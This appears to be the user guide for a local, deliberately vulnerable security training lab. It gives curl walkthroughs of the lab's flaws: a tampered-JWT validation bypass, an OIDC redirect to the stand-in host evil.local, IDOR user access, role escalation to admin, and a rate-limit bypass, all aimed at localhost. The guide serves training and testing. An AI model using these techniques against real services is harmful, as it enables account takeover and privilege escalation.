# VaporLab User Guide

## 1. Start the Lab
```bash
docker-compose -f docker-compose.dev.yml up -d --build
```

## 2. Open Interfaces
- Frontend Console: `http://localhost:15100`
- API Health: `http://localhost:18080/healthz`
- Prometheus: `http://localhost:19090`
- Grafana: `http://localhost:13000`
- Jaeger: `http://localhost:16687`

## 3. Frontend Walkthrough
The Next.js dashboard provides:
- Health + secure mode status
- JWT issuance preview
- Users surface preview
- Chain probe panel

## 4. Authentication Walkthrough (Sprint 1)
```bash
curl -s -X POST http://localhost:18080/auth/jwt/issue \
  -H 'content-type: application/json' \
  -d '{"user_id":"42"}'
```

Broken JWT exploit:
```bash
TOKEN=$(curl -s -X POST http://localhost:18080/auth/jwt/issue -H 'content-type: application/json' -d '{"user_id":"42"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
HP=$(echo "$TOKEN" | awk -F'.' '{print $1"."$2}')
curl -s -X POST http://localhost:18080/auth/jwt/validate \
  -H 'content-type: application/json' \
  -d "{\"token\":\"${HP}.tampered\"}"
```

OIDC misuse demo:
```bash
curl -i "http://localhost:18080/oidc/authorize?client_id=lab&redirect_uri=http://evil.local/cb&state=demo"
```

## 5. Users Walkthrough (Sprint 2)
IDOR/BOLA:
```bash
curl -s http://localhost:18080/users/2
```

Role escalation:
```bash
curl -s -X PATCH http://localhost:18080/users/1 \
  -H 'content-type: application/json' \
  -d '{"role":"admin"}'
```

Rate-limit bypass:
```bash
curl -s http://localhost:18080/users/rate-limit-bypass
```

## 6. QA Smoke Script
```bash
bash scripts/qa_tests.sh http://localhost:18080
```

## 7. Environment Port Sets
- Dev: frontend `15100`, api `18080`
- QA: frontend `25100`, api `28080`
- Prod: frontend `35100`, api `38080`
